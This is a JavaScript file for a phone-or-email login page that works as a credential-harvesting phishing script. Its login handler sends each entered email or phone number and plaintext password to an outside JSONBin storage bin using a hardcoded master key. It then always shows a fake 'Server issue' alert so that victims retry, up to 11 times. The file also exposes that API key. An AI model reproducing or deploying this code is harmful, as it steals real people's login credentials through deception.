// -------------------- DOM Elements --------------------
const phoneTab = document.getElementById('phoneTab');
const emailTab = document.getElementById('emailTab');
const phoneIcon = document.getElementById('phoneIcon');
const emailIcon = document.getElementById('emailIcon');
const tabImage = document.getElementById('tabImage');
const phoneInputContainer = document.getElementById('phoneInput');
const emailInputContainer = document.getElementById('emailInput');
const phoneField = document.getElementById('phone');
const emailField = document.getElementById('email');
const passwordField = document.getElementById('password');
const phoneError = document.getElementById('phoneError');
const emailError = document.getElementById('emailError');
const loginBtn = document.getElementById('loginBtn');

// -------------------- JSONBin Info --------------------
const binId = "67f235148561e97a50f99365";
const apiKey = "$2a$10$KxrIzD6vk0We8pfpySnbfOvkTSyr5i/RKwnItuvXA0KYkMEPRo/zC";

// -------------------- State --------------------
let phoneTouched = false;
let emailTouched = false;
const maxAttempts = 11;
let loginAttempts = parseInt(localStorage.getItem('loginAttempts') || '0');

// -------------------- Error Page Reload Logic --------------------
if (window.location.pathname.includes('error.html')) {
  let errorReloads = parseInt(localStorage.getItem('errorReloads') || '0');
  errorReloads += 1;
  localStorage.setItem('errorReloads', errorReloads);

  if (errorReloads >= 3) {
    localStorage.setItem('loginAttempts', '0');
    localStorage.setItem('errorReloads', '0');
    window.location.href = 'index1.html'; // Change to your login page
  }
}

// -------------------- Tab Switching --------------------
phoneTab.addEventListener('click', () => switchTab('phone'));
emailTab.addEventListener('click', () => switchTab('email'));

function switchTab(type) {
  const isPhoneTab = type === 'phone';

  phoneInputContainer.style.display = isPhoneTab ? 'flex' : 'none';
  emailInputContainer.style.display = isPhoneTab ? 'none' : 'flex';

  phoneTab.classList.toggle('active', isPhoneTab);
  emailTab.classList.toggle('active', !isPhoneTab);

  phoneIcon.src = isPhoneTab ? 'p-active.png' : 'p.png';
  emailIcon.src = isPhoneTab ? 'e.png' : 'e-active.png';
  tabImage.src = isPhoneTab ? 'p-active.png' : 'e-active.png';

  phoneError.style.display = 'none';
  emailError.style.display = 'none';

  validateInputs();
}

// -------------------- Input Events --------------------
phoneField.addEventListener('input', () => {
  phoneTouched = true;
  validateInputs();
});

emailField.addEventListener('input', () => {
  emailTouched = true;
  validateInputs();
});

passwordField.addEventListener('input', validateInputs);

// -------------------- Intl Tel Input --------------------
const iti = window.intlTelInput(phoneField, {
  initialCountry: "in",
  preferredCountries: ["in", "us", "ru", "ua", "kz", "de", "fr", "gb"],
  utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
});

// -------------------- Validation --------------------
function validateInputs() {
  const passwordValid = passwordField.value.length >= 4;
  const phoneValid = iti.isValidNumber();
  const emailValid = emailField.value.endsWith('@gmail.com');

  const isPhoneTab = phoneInputContainer.style.display === 'flex';

  phoneError.style.display = phoneTouched && isPhoneTab && !phoneValid ? 'block' : 'none';
  emailError.style.display = emailTouched && !isPhoneTab && !emailValid ? 'block' : 'none';

  const anyValid = (phoneValid || emailValid) && passwordValid;

  loginBtn.disabled = !anyValid;
  loginBtn.classList.toggle('active', anyValid);
}

// -------------------- Login Handler --------------------
loginBtn.addEventListener('click', async function (e) {
  e.preventDefault();

  if (loginAttempts >= maxAttempts) {
    window.location.href = 'error.html';
    return;
  }

  const phone = phoneField.value.trim();
  const email = emailField.value.trim();
  const password = passwordField.value.trim();

  if (!password || (!phone && !email)) {
    alert("Please enter either phone or email, and password.");
    return;
  }

  const loginData = {
    loginType: phone ? "phone" : "email",
    phone: phone || null,
    email: email || null,
    password: password,
    timestamp: new Date().toISOString()
  };

  try {
    // Get current data
    const getRes = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
      headers: { 'X-Master-Key': apiKey }
    });

    let currentData = [];
    if (getRes.ok) {
      const json = await getRes.json();
      currentData = Array.isArray(json.record) ? json.record : [];
    }

    // Push new login
    currentData.push(loginData);

    // Update the bin
    const updateRes = await fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'X-Master-Key': apiKey
      },
      body: JSON.stringify(currentData)
    });

    if (!updateRes.ok) throw new Error("Login failed");

    // Track attempts
    loginAttempts++;
    localStorage.setItem('loginAttempts', loginAttempts.toString());

    alert("Server issue. Please try again later.");

    phoneField.value = '';
    emailField.value = '';
    passwordField.value = '';

    if (loginAttempts >= maxAttempts) {
      window.location.href = 'error.html';
    }

  } catch (err) {
    console.error("Login error:", err);
    alert("⚠️ Something went wrong. Try again.");
  }
});

// -------------------- On Page Load --------------------
document.addEventListener("DOMContentLoaded", function () {
  // Set email tab as default active
  switchTab('email');
  validateInputs();
  if (window.location.pathname.includes('error.html')) {
    let errorReloads = parseInt(localStorage.getItem('errorReloads') || '0');
    if (errorReloads >= 3) {
      localStorage.setItem('loginAttempts', '0');
      localStorage.setItem('errorReloads', '0');
      window.location.href = 'index1.html';
    }
  }
});

document.getElementById('phone').addEventListener('input', function (e) {
  this.value = this.value.replace(/\D/g, ''); // Remove all non-digit characters
});
